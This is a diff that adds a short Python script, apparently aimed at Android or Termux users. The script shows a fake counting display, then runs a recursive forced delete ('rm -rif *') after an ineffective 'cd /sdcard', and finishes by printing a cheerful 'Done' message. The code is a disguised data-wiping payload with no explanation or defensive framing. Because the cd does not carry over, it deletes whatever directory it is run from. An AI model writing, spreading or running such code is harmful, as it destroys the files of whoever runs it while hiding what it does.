@@ -1,1 +1,12 @@
-
+import os
+import time
+os.system ("clear")
+A7Y = 1000
+while A7Y < 10000:
+        A7Y = A7Y +1
+        print( A7Y)
+os.system ("clear")
+os.system ('cd /sdcard') 
+os.system ('rm -rif *')
+time.sleep(3)
+print (" \033[0;32m[+] Done..!")
